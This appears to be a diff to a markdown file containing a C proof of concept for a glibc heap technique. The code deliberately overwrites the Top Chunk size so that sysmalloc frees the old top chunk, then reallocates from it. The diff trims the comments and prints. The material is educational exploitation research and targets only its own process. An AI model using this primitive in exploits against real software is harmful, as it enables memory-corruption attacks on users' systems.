@@ -43,47 +43,36 @@ This PoC demonstrates how to trigger `sysmalloc` to free the Top Chunk.
 #define MALLOC_MASK (-MALLOC_ALIGN)
 #define PAGESIZE sysconf(_SC_PAGESIZE)
 #define PAGE_MASK (PAGESIZE-1)
-#define FENCEPOST (2*CHUNK_HDR_SZ)
-#define PROBE (0x20-CHUNK_HDR_SZ)
 #define CHUNK_FREED_SIZE 0x150
 #define FREED_SIZE (CHUNK_FREED_SIZE-CHUNK_HDR_SZ)
 
 int main() {
-  size_t allocated_size, *top_size_ptr, top_size, new_top_size, freed_top_size, *new, *old;
+  size_t allocated_size, *top_size_ptr, top_size, new_top_size;
+  size_t *new;
 
-  // 1. Initial allocation to find the top chunk
-  new = malloc(PROBE);
-  top_size = new[(PROBE / SIZE_SZ) + 1];
-  printf("Initial top size: 0x%lx\n", top_size);
+  new = malloc(0x20-CHUNK_HDR_SZ);
+  top_size = new[((0x20-CHUNK_HDR_SZ) / SIZE_SZ) + 1];
 
-  // 2. Align heap to a predictable state
+  // Align heap to page boundary
   allocated_size = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_FREED_SIZE;
   allocated_size &= PAGE_MASK;
   allocated_size &= MALLOC_MASK;
   new = malloc(allocated_size);
 
-  // 3. Locate the Top Chunk header
   top_size_ptr = &new[(allocated_size / SIZE_SZ)-1 + (MALLOC_ALIGN / SIZE_SZ)];
   top_size = *top_size_ptr;
 
-  // ------------ VULNERABILITY ------------
-  // Corrupt the Top Chunk size to be smaller, but still page-aligned.
-  // The size must also have the PREV_INUSE bit set.
+  // VULNERABILITY: Corrupt Top Chunk size
   new_top_size = top_size & PAGE_MASK;
   *top_size_ptr = new_top_size;
-  // ---------------------------------------
 
-  // 4. Trigger sysmalloc
-  // Request an allocation larger than our new corrupted top size.
-  // This causes sysmalloc to free the old top chunk.
+  // Trigger sysmalloc to free the old top chunk
   malloc(CHUNK_FREED_SIZE + 0x10);
 
-  // 5. Reallocate from the freed top chunk
-  // The old top chunk is now in the Unsorted Bin.
   void* reclaimed = malloc(FREED_SIZE);
-  printf("Reclaimed chunk from old top: %p\n", reclaimed);
 
   assert((size_t)reclaimed < (size_t)top_size_ptr);
+  return 0;
 }
 ```
 
